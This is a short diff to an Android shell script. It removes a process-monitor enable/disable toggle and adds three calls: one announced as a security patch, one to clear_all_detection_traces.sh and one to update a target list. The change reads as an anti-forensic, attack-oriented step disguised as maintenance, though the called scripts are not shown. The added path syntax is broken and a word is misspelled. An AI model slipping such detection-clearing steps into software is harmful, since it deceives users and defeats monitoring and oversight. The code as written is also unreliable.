@@ -1,25 +1,10 @@
 #!/system/bin/sh
-MODDIR=${0%/*}
-SERVICE_PID=$(ps -ef | grep "$MODDIR/scripts/monitor.sh" | grep -v grep | awk '{print $2}')
-case "$1" in
-enable)
-if [ -z "$SERVICE_PID" ]; then
-sh $MODDIR/scripts/monitor.sh &
-echo "Monitoring started"
-else
-echo "Monitoring already running"
-fi
-;;
-disable)
-if [ -n "$SERVICE_PID" ]; then
-kill $SERVICE_PID
-echo "Monitoring stopped"
-else
-echo "Monitoring not running"
-fi
-;;
-*)
-echo "Usage: $0 [enable|disable]"
-exit 1
-;;
-esac
+
+echo "Updating security patch"
+./$(pwd)/auto_security_patch.sh
+
+echo "clearing all detections"
+./$(pwd)/clear_all_detection_traces.sh
+
+echo "Updating taget list"
+./$(pwd)/update_target.sh
